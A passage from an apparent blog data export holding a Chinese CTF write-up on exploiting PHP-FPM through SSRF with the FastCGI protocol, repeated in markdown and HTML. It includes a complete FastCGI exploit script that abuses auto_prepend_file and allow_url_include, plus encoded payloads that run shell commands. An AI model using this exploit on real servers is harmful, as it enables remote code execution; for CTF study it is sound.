57 41 52 45 70 68 70 2F 66 63 67 69 63 6C 69\n   65 6E 74 0B 09 52 45 4D 4F 54 45 5F 41 44 44 52\n   31 32 37 2E 30 2E 30 2E 31 0B 04 52 45 4D 4F 54\n   45 5F 50 4F 52 54 39 39 38 35 0B 09 53 45 52 56\n   45 52 5F 41 44 44 52 31 32 37 2E 30 2E 30 2E 31\n   0B 02 53 45 52 56 45 52 5F 50 4F 52 54 38 30 0B\n   09 53 45 52 56 45 52 5F 4E 41 4D 45 6C 6F 63 61\n   6C 68 6F 73 74 0F 08 53 45 52 56 45 52 5F 50 52\n   4F 54 4F 43 4F 4C 48 54 54 50 2F 31 2E 31 0C 10\n   43 4F 4E 54 45 4E 54 5F 54 59 50 45 61 70 70 6C\n   69 63 61 74 69 6F 6E 2F 74 65 78 74 0E 02 43 4F\n   4E 54 45 4E 54 5F 4C 45 4E 47 54 48 33 37 09 1F\n   50 48 50 5F 56 41 4C 55 45 61 75 74 6F 5F 70 72\n   65 70 65 6E 64 5F 66 69 6C 65 20 3D 20 70 68 70\n   3A 2F 2F 69 6E 70 75 74 0F 16 50 48 50 5F 41 44\n   4D 49 4E 5F 56 41 4C 55 45 61 6C 6C 6F 77 5F 75\n   72 6C 5F 69 6E 63 6C 75 64 65 20 3D 20 4F 6E 01\n   04 11 C4 00 00 00 00 01 05 11 C4 00 25 00 00 3C\n   3F 70 68 70 20 76 61 72 5F 64 75 6D 70 28 73 68\n   65 6C 6C 5F 65 78 65 63 28 27 6C 73 20 2F 27 29\n   29 3B 3F 3E 01 05 11 C4 00 00 00 00\n   \n   \n   '''\n   a=a.replace('\\n','')\n   a=a.replace(' ','')\n   b=''\n   length=len(a)\n   for i in range(0,length,2):\n       b+='%'\n       b+=a[i]\n       b+=a[i+1]\n   print(b)\n   \n   ```\n\n   得到url编码后的攻击流量\n\n   ```\nn   ```\n\n   但由于要进行两次请求，因此还要进行一次url编码，最终结果如下\n\n   ```\n   %2501%2501%2511%25C4%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%2511%25C4%2501%25E7%2500%2500%2511%250B%2547%2541%2554%2545%2557%2541%2559%255F%2549%254E%2554%2545%2552%2546%2541%2543%2545%2546%2561%2573%2574%2543%2547%2549%252F%2531%252E%2530%250E%2504%2552%2545%2551%2555%2545%2553%2554%255F%254D%2545%2554%2548%254F%2544%2550%254F%2553%2554%250F%251B%2553%2543%2552%2549%2550%2554%255F%2546%2549%254C%2545%254E%2541%254D%2545%252F%2575%2573%2572%252F%256C%256F%2563%2561%256C%252F%256C%2569%2562%252F%2570%2568%2570%252F%2550%2545%2541%2552%252E%2570%2568%2570%250B%251B%2553%2543%2552%2549%2550%2554%255F%254E%2541%254D%2545%252F%2575%2573%2572%252F%256C%256F%2563%2561%256C%252F%256C%2569%2562%252F%2570%2568%2570%252F%2550%2545%2541%2552%252E%2570%2568%2570%250C%2500%2551%2555%2545%2552%2559%255F%2553%2554%2552%2549%254E%2547%250B%251B%2552%2545%2551%2555%2545%2553%2554%255F%2555%2552%2549%252F%2575%2573%2572%252F%256C%256F%2563%2561%256C%252F%256C%2569%2562%252F%2570%2568%2570%252F%2550%2545%2541%2552%252E%2570%2568%2570%250D%2501%2544%254F%2543%2555%254D%2545%254E%2554%255F%2552%254F%254F%2554%252F%250F%250E%2553%2545%2552%2556%2545%2552%255F%2553%254F%2546%2554%2557%2541%2552%2545%2570%2568%2570%252F%2566%2563%2567%2569%2563%256C%2569%2565%256E%2574%250B%2509%2552%2545%254D%254F%2554%2545%255F%2541%2544%2544%2552%2531%2532%2537%252E%2530%252E%2530%252E%2531%250B%2504%2552%2545%254D%254F%2554%2545%255F%2550%254F%2552%2554%2539%2539%2538%2535%250B%2509%2553%2545%2552%2556%2545%2552%255F%2541%2544%2544%2552%2531%2532%2537%252E%2530%252E%2530%252E%2531%250B%2502%2553%2545%2552%2556%2545%2552%255F%2550%254F%2552%2554%2538%2530%250B%2509%2553%2545%2552%2556%2545%2552%255F%254E%2541%254D%2545%256C%256F%2563%2561%256C%2568%256F%2573%2574%250F%2508%2553%2545%2552%2556%2545%2552%255F%2550%2552%254F%2554%254F%2543%254F%254C%2548%2554%2554%2550%252F%2531%252E%2531%250C%2510%2543%254F%254E%2554%2545%254E%2554%255F%2554%2559%2550%2545%2561%2570%2570%256C%2569%2563%2561%2574%2569%256F%256E%252F%2574%2565%2578%2574%250E%2502%2543%254F%254E%2554%2545%254E%2554%255F%254C%2545%254E%2547%2554%2548%2533%2537%2509%251F%2550%2548%2550%255F%2556%2541%254C%2555%2545%2561%2575%2574%256F%255F%2570%2572%2565%2570%2565%256E%2564%255F%2566%2569%256C%2565%2520%253D%2520%2570%2568%2570%253A%252F%252F%2569%256E%2570%2575%2574%250F%2516%2550%2548%2550%255F%2541%2544%254D%2549%254E%255F%2556%2541%254C%2555%2545%2561%256C%256C%256F%2577%255F%2575%2572%256C%255F%2569%256E%2563%256C%2575%2564%2565%2520%253D%2520%254F%256E%2501%2504%2511%25C4%2500%2500%2500%2500%2501%2505%2511%25C4%2500%2525%2500%2500%253C%253F%2570%2568%2570%2520%2576%2561%2572%255F%2564%2575%256D%2570%2528%2573%2568%2565%256C%256C%255F%2565%2578%2565%2563%2528%2527%256C%2573%2520%252F%2527%2529%2529%253B%253F%253E%2501%2505%2511%25C4%2500%2500%2500%2500\n   ```\n\n3. 由于PHP-FPM默认监听9000端口，所以攻击的端口也为9000\n\n   ![image-20210719053932114](https://gitee.com/h1ler/blogimage/raw/master/img/image-20210719053932114.png)\n\n   成功执行\n\n4. 接着进行同样的步骤执行`cat /flag_49b379d8b061225b3ed4bc32986b087f`\n\n   两次url编码后的攻击流量为\n\n   ```\nn   ```\n\n   成功执行\n\n   ![image-20210719055237991](https://gitee.com/h1ler/blogimage/raw/master/img/image-20210719055237991.png)\n   \n5. 另外可以使用Gopherus这个工具，更简单一些\n\n   ![image-20210719062324937](https://gitee.com/h1ler/blogimage/raw/master/img/image-20210719062324937.png)\n\n   ![image-20210719062711350](https://gitee.com/h1ler/blogimage/raw/master/img/image-20210719062711350.png)\n\n   此处payload要再次进行编码才能使用\n\n总结流程：\n\n**1.探测开放端口（这道题不用）**\n\n**2.本地构造攻击流量，通过监听端口然后url转码的形式**\n\n**3.ssrf攻击**\n\n> 参考\n>\n> https://liloong3t.com/2021/02/16/2021-2-16-ssrf-shi-yong-gopher-xie-yi/\n>\n> https://blog.csdn.net/mysteryflower/article/details/94386461\n>\n> https://blog.csdn.net/shreck66/article/details/50355729\n>\n> https://blog.csdn.net/rfrder/article/details/108589988\n\n","source":"_posts/CTFHub中关于FastCGI协议的SSRF.md","raw":"---\ntitle: CTFHub中关于FastCGI协议的SSRF\ndate: {{ date }}\ntop: false\ncover: false\npassword:\ntoc: true\nmathjax: true\nsummary:\ntags: [SSRF,CTF]\ncategories: [SSRF,CTF]\n---\n\n\n\n# 解题步骤\n\n1. 监听9000端口，因为PHP-FPM默认监听9000端口\n\n   ![image-20210719051814927](https://gitee.com/h1ler/blogimage/raw/master/img/image-20210719051814927.png)\n\n   exp如下：\n\n   ```python\n   #ssrf_fastcgi_fpm.py\n   import socket\n   import random\n   import argparse\n   import sys\n   from io import BytesIO\n   \n   # Referrer: https://github.com/wuyunfeng/Python-FastCGI-Client\n   \n   PY2 = True if sys.version_info.major == 2 else False\n   \n   \n   def bchr(i):\n       if PY2:\n           return force_bytes(chr(i))\n       else:\n           return bytes([i])\n   \n   def bord(c):\n       if isinstance(c, int):\n           return c\n       else:\n           return ord(c)\n   \n   def force_bytes(s):\n       if isinstance(s, bytes):\n           return s\n       else:\n           return s.encode('utf-8', 'strict')\n   \n   def force_text(s):\n       if issubclass(type(s), str):\n           return s\n       if isinstance(s, bytes):\n           s = str(s, 'utf-8', 'strict')\n       else:\n           s = str(s)\n       return s\n   \n   \n   class FastCGIClient:\n       \"\"\"A Fast-CGI Client for Python\"\"\"\n   \n       # private\n       __FCGI_VERSION = 1\n   \n       __FCGI_ROLE_RESPONDER = 1\n       __FCGI_ROLE_AUTHORIZER = 2\n       __FCGI_ROLE_FILTER = 3\n   \n       __FCGI_TYPE_BEGIN = 1\n       __FCGI_TYPE_ABORT = 2\n       __FCGI_TYPE_END = 3\n       __FCGI_TYPE_PARAMS = 4\n       __FCGI_TYPE_STDIN = 5\n       __FCGI_TYPE_STDOUT = 6\n       __FCGI_TYPE_STDERR = 7\n       __FCGI_TYPE_DATA = 8\n       __FCGI_TYPE_GETVALUES = 9\n       __FCGI_TYPE_GETVALUES_RESULT = 10\n       __FCGI_TYPE_UNKOWNTYPE = 11\n   \n       __FCGI_HEADER_SIZE = 8\n   \n       # request state\n       FCGI_STATE_SEND = 1\n       FCGI_STATE_ERROR = 2\n       FCGI_STATE_SUCCESS = 3\n   \n       def __init__(self, host, port, timeout, keepalive):\n           self.host = host\n           self.port = port\n           self.timeout = timeout\n           if keepalive:\n               self.keepalive = 1\n           else:\n               self.keepalive = 0\n           self.sock = None\n           self.requests = dict()\n   \n       def __connect(self):\n           self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n           self.sock.settimeout(self.timeout)\n           self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n           # if self.keepalive:\n           #     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1)\n           # else:\n           #     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0)\n           try:\n               self.sock.connect((self.host, int(self.port)))\n           except socket.error as msg:\n               self.sock.close()\n               self.sock = None\n               print(repr(msg))\n               return False\n           return True\n   \n       def __encodeFastCGIRecord(self, fcgi_type, content, requestid):\n           length = len(content)\n           buf = bchr(FastCGIClient.__FCGI_VERSION) \\\n                  + bchr(fcgi_type) \\\n                  + bchr((requestid >> 8) & 0xFF) \\\n                  + bchr(requestid & 0xFF) \\\n                  + bchr((length >> 8) & 0xFF) \\\n                  + bchr(length & 0xFF) \\\n                  + bchr(0) \\\n                  + bchr(0) \\\n                  + content\n           return buf\n   \n       def __encodeNameValueParams(self, name, value):\n           nLen = len(name)\n           vLen = len(value)\n           record = b''\n           if nLen < 128:\n               record += bchr(nLen)\n           else:\n               record += bchr((nLen >> 24) | 0x80) \\\n                         + bchr((nLen >> 16) & 0xFF) \\\n                         + bchr((nLen >> 8) & 0xFF) \\\n                         + bchr(nLen & 0xFF)\n           if vLen < 128:\n               record += bchr(vLen)\n           else:\n               record += bchr((vLen >> 24) | 0x80) \\\n                         + bchr((vLen >> 16) & 0xFF) \\\n                         + bchr((vLen >> 8) & 0xFF) \\\n                         + bchr(vLen & 0xFF)\n           return record + name + value\n   \n       def __decodeFastCGIHeader(self, stream):\n           header = dict()\n           header['version'] = bord(stream[0])\n           header['type'] = bord(stream[1])\n           header['requestId'] = (bord(stream[2]) << 8) + bord(stream[3])\n           header['contentLength'] = (bord(stream[4]) << 8) + bord(stream[5])\n           header['paddingLength'] = bord(stream[6])\n           header['reserved'] = bord(stream[7])\n           return header\n   \n       def __decodeFastCGIRecord(self, buffer):\n           header = buffer.read(int(self.__FCGI_HEADER_SIZE))\n   \n           if not header:\n               return False\n           else:\n               record = self.__decodeFastCGIHeader(header)\n               record['content'] = b''\n   \n               if 'contentLength' in record.keys():\n                   contentLength = int(record['contentLength'])\n                   record['content'] += buffer.read(contentLength)\n               if 'paddingLength' in record.keys():\n                   skiped = buffer.read(int(record['paddingLength']))\n               return record\n   \n       def request(self, nameValuePairs={}, post=''):\n           if not self.__connect():\n               print('connect failure! please check your fasctcgi-server !!')\n               return\n   \n           requestId = random.randint(1, (1 << 16) - 1)\n           self.requests[requestId] = dict()\n           request = b\"\"\n           beginFCGIRecordContent = bchr(0) \\\n                                    + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \\\n                                    + bchr(self.keepalive) \\\n                                    + bchr(0) * 5\n           request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,\n                                                 beginFCGIRecordContent, requestId)\n           paramsRecord = b''\n           if nameValuePairs:\n               for (name, value) in nameValuePairs.items():\n                   name = force_bytes(name)\n                   value = force_bytes(value)\n                   paramsRecord += self.__encodeNameValueParams(name, value)\n   \n           if paramsRecord:\n               request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)\n           request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, b'', requestId)\n   \n           if post:\n               request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId)\n           request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, b'', requestId)\n   \n           self.sock.send(request)\n           self.requests[requestId]['state'] = FastCGIClient.FCGI_STATE_SEND\n           self.requests[requestId]['response'] = b''\n           return self.__waitForResponse(requestId)\n   \n       def __waitForResponse(self, requestId):\n           data = b''\n           while True:\n               buf = self.sock.recv(512)\n               if not len(buf):\n                   break\n               data += buf\n   \n           data = BytesIO(data)\n           while True:\n               response = self.__decodeFastCGIRecord(data)\n               if not response:\n                   break\n               if response['type'] == FastCGIClient.__FCGI_TYPE_STDOUT \\\n                       or response['type'] == FastCGIClient.__FCGI_TYPE_STDERR:\n                   if response['type'] == FastCGIClient.__FCGI_TYPE_STDERR:\n                       self.requests['state'] = FastCGIClient.FCGI_STATE_ERROR\n                   if requestId == int(response['requestId']):\n                       self.requests[requestId]['response'] += response['content']\n               if response['type'] == FastCGIClient.FCGI_STATE_SUCCESS:\n                   self.requests[requestId]\n           return self.requests[requestId]['response']\n   \n       def __repr__(self):\n           return \"fastcgi connect host:{} port:{}\".format(self.host, self.port)\n   \n   \n   if __name__ == '__main__':\n       parser = argparse.ArgumentParser(description='Php-fpm code execution vulnerability client.')\n       parser.add_argument('host', help='Target host, such as 127.0.0.1')\n       parser.add_argument('file', help='A php file absolute path, such as /usr/local/lib/php/System.php')\n       parser.add_argument('-c', '--code', help='What php code your want to execute', default='<?php phpinfo(); exit; ?>')\n       parser.add_argument('-p', '--port', help='FastCGI port', default=9000, type=int)\n   \n       args = parser.parse_args()\n   \n       client = FastCGIClient(args.host, args.port, 3, 0)\n       params = dict()\n       documentRoot = \"/\"\n       uri = args.file\n       content = args.code\n       params = {\n           'GATEWAY_INTERFACE': 'FastCGI/1.0',\n           'REQUEST_METHOD': 'POST',\n           'SCRIPT_FILENAME': documentRoot + uri.lstrip('/'),\n           'SCRIPT_NAME': uri,\n           'QUERY_STRING': '',\n           'REQUEST_URI': uri,\n           'DOCUMENT_ROOT': documentRoot,\n           'SERVER_SOFTWARE': 'php/fcgiclient',\n           'REMOTE_ADDR': '127.0.0.1',\n           'REMOTE_PORT': '9985',\n           'SERVER_ADDR': '127.0.0.1',\n           'SERVER_PORT': '80',\n           'SERVER_NAME': \"localhost\",\n           'SERVER_PROTOCOL': 'HTTP/1.1',\n           'CONTENT_TYPE': 'application/text',\n           'CONTENT_LENGTH': \"%d\" % len(content),\n           'PHP_VALUE': 'auto_prepend_file = php://input',\n           'PHP_ADMIN_VALUE': 'allow_url_include = On'\n       }\n       response = client.request(params, content)\n   \n   ```\n\n   以`py fpm.py -c [php语句] -p port host path `格式执行即可\n\n2. 首先执行`ls /`命令\n\n   ```bash\n   python ssrf_fastcgi_fpm.py -c \"<?php var_dump(shell_exec('ls /'));?>\" -p 9000 127.0.0.1 /usr/local/lib/php/PEAR.php\n   ```\n\n   得到利用exp获得的攻击流量1.txt，用010editor打开![image-20210719052340479](https://gitee.com/h1ler/blogimage/raw/master/img/image-20210719052340479.png)\n\n   以十六进制文本的形式复制下来，用以下脚本进行url编码\n\n   ```python\n   a='''\n   01 01 11 C4 00 08 00 00 00 01 00 00 00 00 00 00\n   01 04 11 C4 01 E7 00 00 11 0B 47 41 54 45 57 41\n   59 5F 49 4E 54 45 52 46 41 43 45 46 61 73 74 43\n   47 49 2F 31 2E 30 0E 04 52 45 51 55 45 53 54 5F\n   4D 45 54 48 4F 44 50 4F 53 54 0F 1B 53 43 52 49\n   50 54 5F 46 49 4C 45 4E 41 4D 45 2F 75 73 72 2F\n   6C 6F 63 61 6C 2F 6C 69 62 2F 70 68 70 2F 50 45\n   41 52 2E 70 68 70 0B 1B 53 43 52 49 50 54 5F 4E\n   41 4D 45 2F 75 73 72 2F 6C 6F 63 61 6C 2F 6C 69\n   62 2F 70 68 70 2F 50 45 41 52 2E 70 68 70 0C 00\n   51 55 45 52 59 5F 53 54 52 49 4E 47 0B 1B 52 45\n   51 55 45 53 54 5F 55 52 49 2F 75 73 72 2F 6C 6F\n   63 61 6C 2F 6C 69 62 2F 70 68 70 2F 50 45 41 52\n   2E 70 68 70 0D 01 44 4F 43 55 4D 45 4E 54 5F 52\n   4F 4F 54 2F 0F 0E 53 45 52 56 45 52 5F 53 4F 46\n   54 57 41 52 45 70 68 70 2F 66 63 67 69 63 6C 69\n   65 6E 74 0B 09 52 45 4D 4F 54 45 5F 41 44 44 52\n   31 32 37 2E 30 2E 30 2E 31 0B 04 52 45 4D 4F 54\n   45 5F 50 4F 52 54 39 39 38 35 0B 09 53 45 52 56\n   45 52 5F 41 44 44 52 31 32 37 2E 30 2E 30 2E 31\n   0B 02 53 45 52 56 45 52 5F 50 4F 52 54 38 30 0B\n   09 53 45 52 56 45 52 5F 4E 41 4D 45 6C 6F 63 61\n   6C 68 6F 73 74 0F 08 53 45 52 56 45 52 5F 50 52\n   4F 54 4F 43 4F 4C 48 54 54 50 2F 31 2E 31 0C 10\n   43 4F 4E 54 45 4E 54 5F 54 59 50 45 61 70 70 6C\n   69 63 61 74 69 6F 6E 2F 74 65 78 74 0E 02 43 4F\n   4E 54 45 4E 54 5F 4C 45 4E 47 54 48 33 37 09 1F\n   50 48 50 5F 56 41 4C 55 45 61 75 74 6F 5F 70 72\n   65 70 65 6E 64 5F 66 69 6C 65 20 3D 20 70 68 70\n   3A 2F 2F 69 6E 70 75 74 0F 16 50 48 50 5F 41 44\n   4D 49 4E 5F 56 41 4C 55 45 61 6C 6C 6F 77 5F 75\n   72 6C 5F 69 6E 63 6C 75 64 65 20 3D 20 4F 6E 01\n   04 11 C4 00 00 00 00 01 05 11 C4 00 25 00 00 3C\n   3F 70 68 70 20 76 61 72 5F 64 75 6D 70 28 73 68\n   65 6C 6C 5F 65 78 65 63 28 27 6C 73 20 2F 27 29\n   29 3B 3F 3E 01 05 11 C4 00 00 00 00\n   \n   \n   '''\n   a=a.replace('\\n','')\n   a=a.replace(' ','')\n   b=''\n   length=len(a)\n   for i in range(0,length,2):\n       b+='%'\n       b+=a[i]\n       b+=a[i+1]\n   print(b)\n   \n   ```\n\n   得到url编码后的攻击流量\n\n   ```\nn   ```\n\n   但由于要进行两次请求，因此还要进行一次url编码，最终结果如下\n\n   ```\nn   ```\n\n3. 由于PHP-FPM默认监听9000端口，所以攻击的端口也为9000\n\n   ![image-20210719053932114](https://gitee.com/h1ler/blogimage/raw/master/img/image-20210719053932114.png)\n\n   成功执行\n\n4. 接着进行同样的步骤执行`cat /flag_49b379d8b061225b3ed4bc32986b087f`\n\n   两次url编码后的攻击流量为\n\n   ```\nn   ```\n\n   成功执行\n\n   ![image-20210719055237991](https://gitee.com/h1ler/blogimage/raw/master/img/image-20210719055237991.png)\n   \n5. 另外可以使用Gopherus这个工具，更简单一些\n\n   ![image-20210719062324937](https://gitee.com/h1ler/blogimage/raw/master/img/image-20210719062324937.png)\n\n   ![image-20210719062711350](https://gitee.com/h1ler/blogimage/raw/master/img/image-20210719062711350.png)\n\n   此处payload要再次进行编码才能使用\n\n总结流程：\n\n**1.探测开放端口（这道题不用）**\n\n**2.本地构造攻击流量，通过监听端口然后url转码的形式**\n\n**3.ssrf攻击**\n\n> 参考\n>\n> https://liloong3t.com/2021/02/16/2021-2-16-ssrf-shi-yong-gopher-xie-yi/\n>\n> https://blog.csdn.net/mysteryflower/article/details/94386461\n>\n> https://blog.csdn.net/shreck66/article/details/50355729\n>\n> https://blog.csdn.net/rfrder/article/details/108589988\n\n","slug":"CTFHub中关于FastCGI协议的SSRF","published":1,"updated":"2021-08-21T15:10:30.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cktfnuydh000bt8op9pxncvqj","content":"<h1 id=\"解题步骤\"><a href=\"#解题步骤\" class=\"headerlink\" title=\"解题步骤\"></a>解题步骤</h1><ol>\n<li><p>监听9000端口，因为PHP-FPM默认监听9000端口</p>\n<p><img src=\"https://gitee.com/h1ler/blogimage/raw/master/img/image-20210719051814927.png\" alt=\"image-20210719051814927\"></p>\n<p>exp如下：</p>\n<pre class=\"line-numbers language-python\"><code class=\"language-python\"><span class=\"token comment\" spellcheck=\"true\">#ssrf_fastcgi_fpm.py</span>\n<span class=\"token keyword\">import</span> socket\n<span class=\"token keyword\">import</span> random\n<span class=\"token keyword\">import</span> argparse\n<span class=\"token keyword\">import</span> sys\n<span class=\"token keyword\">from</span> io <span class=\"token keyword\">import</span> BytesIO\n\n<span class=\"token comment\" spellcheck=\"true\"># Referrer: https://github.com/wuyunfeng/Python-FastCGI-Client</span>\n\nPY2 <span class=\"token operator\">=</span> <span class=\"token boolean\">True</span> <span class=\"token keyword\">if</span> sys<span class=\"token punctuation\">.</span>version_info<span class=\"token punctuation\">.</span>major <span class=\"token operator\">==</span> <span class=\"token number\">2</span> <span class=\"token keyword\">else</span> <span class=\"token boolean\">False</span>\n\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n</li>\n</ol>\n<p>   def bchr(i):<br>       if PY2:<br>           return force_bytes(chr(i))<br>       else:<br>           return bytes([i])</p>\n<p>   def bord(c):<br>       if isinstance(c, int):<br>           return c<br>       else:<br>           return ord(c)</p>\n<p>   def force_bytes(s):<br>       if isinstance(s, bytes):<br>           return s<br>       else:<br>           return s.encode(‘utf-8’, ‘strict’)</p>\n<p>   def force_text(s):<br>       if issubclass(type(s), str):<br>           return s<br>       if isinstance(s, bytes):<br>           s = str(s, ‘utf-8’, ‘strict’)<br>       else:<br>           s = str(s)<br>       return s</p>\n<p>   class FastCGIClient:<br>       “””A Fast-CGI Client for Python”””</p>\n<pre><code>   # private\n   __FCGI_VERSION = 1\n\n   __FCGI_ROLE_RESPONDER = 1\n   __FCGI_ROLE_AUTHORIZER = 2\n   __FCGI_ROLE_FILTER = 3\n\n   __FCGI_TYPE_BEGIN = 1\n   __FCGI_TYPE_ABORT = 2\n   __FCGI_TYPE_END = 3\n   __FCGI_TYPE_PARAMS = 4\n   __FCGI_TYPE_STDIN = 5\n   __FCGI_TYPE_STDOUT = 6\n   __FCGI_TYPE_STDERR = 7\n   __FCGI_TYPE_DATA = 8\n   __FCGI_TYPE_GETVALUES = 9\n   __FCGI_TYPE_GETVALUES_RESULT = 10\n   __FCGI_TYPE_UNKOWNTYPE = 11\n\n   __FCGI_HEADER_SIZE = 8\n\n   # request state\n   FCGI_STATE_SEND = 1\n   FCGI_STATE_ERROR = 2\n   FCGI_STATE_SUCCESS = 3\n\n   def __init__(self, host, port, timeout, keepalive):\n       self.host = host\n       self.port = port\n       self.timeout = timeout\n       if keepalive:\n           self.keepalive = 1\n       else:\n           self.keepalive = 0\n       self.sock = None\n       self.requests = dict()\n\n   def __connect(self):\n       self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n       self.sock.settimeout(self.timeout)\n       self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n       # if self.keepalive:\n       #     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1)\n       # else:\n       #     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0)\n       try:\n           self.sock.connect((self.host, int(self.port)))\n       except socket.error as msg:\n           self.sock.close()\n           self.sock = None\n           print(repr(msg))\n           return False\n       return True\n\n   def __encodeFastCGIRecord(self, fcgi_type, content, requestid):\n       length = len(content)\n       buf = bchr(FastCGIClient.__FCGI_VERSION) \\\n              + bchr(fcgi_type) \\\n              + bchr((requestid &gt;&gt; 8) &amp; 0xFF) \\\n              + bchr(requestid &amp; 0xFF) \\\n              + bchr((length &gt;&gt; 8) &amp; 0xFF) \\\n              + bchr(length &amp; 0xFF) \\\n              + bchr(0) \\\n              + bchr(0) \\\n              + content\n       return buf\n\n   def __encodeNameValueParams(self, name, value):\n       nLen = len(name)\n       vLen = len(value)\n       record = b''\n       if nLen &lt; 128:\n           record += bchr(nLen)\n       else:\n           record += bchr((nLen &gt;&gt; 24) | 0x80) \\\n                     + bchr((nLen &gt;&gt; 16) &amp; 0xFF) \\\n                     + bchr((nLen &gt;&gt; 8) &amp; 0xFF) \\\n                     + bchr(nLen &amp; 0xFF)\n       if vLen &lt; 128:\n           record += bchr(vLen)\n       else:\n           record += bchr((vLen &gt;&gt; 24) | 0x80) \\\n                     + bchr((vLen &gt;&gt; 16) &amp; 0xFF) \\\n                     + bchr((vLen &gt;&gt; 8) &amp; 0xFF) \\\n                     + bchr(vLen &amp; 0xFF)\n       return record + name + value\n\n   def __decodeFastCGIHeader(self, stream):\n       header = dict()\n       header['version'] = bord(stream[0])\n       header['type'] = bord(stream[1])\n       header['requestId'] = (bord(stream[2]) &lt;&lt; 8) + bord(stream[3])\n       header['contentLength'] = (bord(stream[4]) &lt;&lt; 8) + bord(stream[5])\n       header['paddingLength'] = bord(stream[6])\n       header['reserved'] = bord(stream[7])\n       return header\n\n   def __decodeFastCGIRecord(self, buffer):\n       header = buffer.read(int(self.__FCGI_HEADER_SIZE))\n\n       if not header:\n           return False\n       else:\n           record = self.__decodeFastCGIHeader(header)\n           record['content'] = b''\n\n           if 'contentLength' in record.keys():\n               contentLength = int(record['contentLength'])\n               record['content'] += buffer.read(contentLength)\n           if 'paddingLength' in record.keys():\n               skiped = buffer.read(int(record['paddingLength']))\n           return record\n\n   def request(self, nameValuePairs={}, post=''):\n       if not self.__connect():\n           print('connect failure! please check your fasctcgi-server !!')\n           return\n\n       requestId = random.randint(1, (1 &lt;&lt; 16) - 1)\n       self.requests[requestId] = dict()\n       request = b\"\"\n       beginFCGIRecordContent = bchr(0) \\\n                                + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \\\n                                + bchr(self.keepalive) \\\n                                + bchr(0) * 5\n       request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,\n                                             beginFCGIRecordContent, requestId)\n       paramsRecord = b''\n       if nameValuePairs:\n           for (name, value) in nameValuePairs.items():\n               name = force_bytes(name)\n               value = force_bytes(value)\n               paramsRecord += self.__encodeNameValueParams(name, value)\n\n       if paramsRecord:\n           request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)\n       request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, b'', requestId)\n\n       if post:\n           request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId)\n       request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, b'', requestId)\n\n       self.sock.send(request)\n       self.requests[requestId]['state'] = FastCGIClient.FCGI_STATE_SEND\n       self.requests[requestId]['response'] = b''\n       return self.__waitForResponse(requestId)\n\n   def __waitForResponse(self, requestId):\n       data = b''\n       while True:\n           buf = self.sock.recv(512)\n           if not len(buf):\n               break\n           data += buf\n\n       data = BytesIO(data)\n       while True:\n           response = self.__decodeFastCGIRecord(data)\n           if not response:\n               break\n           if response['type'] == FastCGIClient.__FCGI_TYPE_STDOUT \\\n                   or response['type'] == FastCGIClient.__FCGI_TYPE_STDERR:\n               if response['type'] == FastCGIClient.__FCGI_TYPE_STDERR:\n                   self.requests['state'] = FastCGIClient.FCGI_STATE_ERROR\n               if requestId == int(response['requestId']):\n                   self.requests[requestId]['response'] += response['content']\n           if response['type'] == FastCGIClient.FCGI_STATE_SUCCESS:\n               self.requests[requestId]\n       return self.requests[requestId]['response']\n\n   def __repr__(self):\n       return \"fastcgi connect host:{} port:{}\".format(self.host, self.port)</code></pre><p>   if <strong>name</strong> == ‘<strong>main</strong>‘:<br>       parser = argparse.ArgumentParser(description=’Php-fpm code execution vulnerability client.’)<br>       parser.add_argument(‘host’, help=’Target host, such as 127.0.0.1’)<br>       parser.add_argument(‘file’, help=’A php file absolute path, such as /usr/local/lib/php/System.php’)<br>       parser.add_argument(‘-c’, ‘–code’, help=’What php code your want to execute’, default=’<!--?php phpinfo(); exit; ?-->‘)<br>       parser.add_argument(‘-p’, ‘–port’, help=’FastCGI port’, default=9000, type=int)</p>\n<pre><code>   args = parser.parse_args()\n\n   client = FastCGIClient(args.host, args.port, 3, 0)\n   params = dict()\n   documentRoot = \"/\"\n   uri = args.file\n   content = args.code\n   params = {\n       'GATEWAY_INTERFACE': 'FastCGI/1.0',\n       'REQUEST_METHOD': 'POST',\n       'SCRIPT_FILENAME': documentRoot + uri.lstrip('/'),\n       'SCRIPT_NAME': uri,\n       'QUERY_STRING': '',\n       'REQUEST_URI': uri,\n       'DOCUMENT_ROOT': documentRoot,\n       'SERVER_SOFTWARE': 'php/fcgiclient',\n       'REMOTE_ADDR': '127.0.0.1',\n       'REMOTE_PORT': '9985',\n       'SERVER_ADDR': '127.0.0.1',\n       'SERVER_PORT': '80',\n       'SERVER_NAME': \"localhost\",\n       'SERVER_PROTOCOL': 'HTTP/1.1',\n       'CONTENT_TYPE': 'application/text',\n       'CONTENT_LENGTH': \"%d\" % len(content),\n       'PHP_VALUE': 'auto_prepend_file = php://input',\n       'PHP_ADMIN_VALUE': 'allow_url_include = On'\n   }\n   response = client.request(params, 